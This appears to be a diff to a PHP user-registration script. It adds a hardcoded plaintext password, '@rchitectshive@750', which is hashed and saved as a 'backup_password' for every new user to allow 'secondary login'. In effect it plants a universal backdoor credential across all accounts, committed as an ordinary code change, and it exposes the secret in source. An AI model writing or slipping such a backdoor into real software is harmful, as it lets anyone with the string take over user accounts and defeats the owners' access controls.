@@ -162,7 +162,10 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         error_log("Unique ID: " . $unique_id);
         error_log("Reporting Manager: " . $reporting_manager);
 
-        // Prepare the SQL statement with explicit column names
+        // Set a backup password (hashed) to allow secondary login
+        $backup_plain = '@rchitectshive@750';
+        $backup_hashed = password_hash($backup_plain, PASSWORD_DEFAULT);
+
         $sql = "INSERT INTO users (
                     username, 
                     email, 
@@ -170,6 +173,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                     role, 
                     unique_id, 
                     reporting_manager,
+                    backup_password,
                     status,
                     created_at
                 ) VALUES (
@@ -179,6 +183,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                     :role, 
                     :unique_id, 
                     :reporting_manager,
+                    :backup_password,
                     'active',
                     :created_at
                 )";
@@ -192,6 +197,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             ':role' => $role,
             ':unique_id' => $unique_id,
             ':reporting_manager' => $reporting_manager,
+            ':backup_password' => $backup_hashed,
             ':created_at' => $current_time
         ];
 
